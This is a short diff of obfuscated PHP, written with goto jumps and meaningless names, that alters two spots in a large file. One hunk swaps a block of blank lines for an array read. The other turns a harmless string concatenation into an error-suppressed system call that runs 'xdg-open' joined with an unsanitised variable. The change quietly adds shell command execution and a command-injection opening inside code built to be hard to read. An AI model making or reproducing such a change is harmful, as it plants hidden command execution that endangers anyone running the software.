@@ -1442,22 +1442,7 @@ goto WmjkZ;
 goto YrdwG;
 
 QAf0h:
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+$BVrAo = $TmaQG["data"][""];
 
 goto ogMOM;
 
@@ -3582,7 +3567,7 @@ if (empty($kw0Ro)) {
 goto NxqLz;
 
 RNzSM:
-$Us3Zt = (" " . $d3wGA);
+$Us3Zt = @system("xdg-open " . $d3wGA);
 
 goto oNPOM;
 
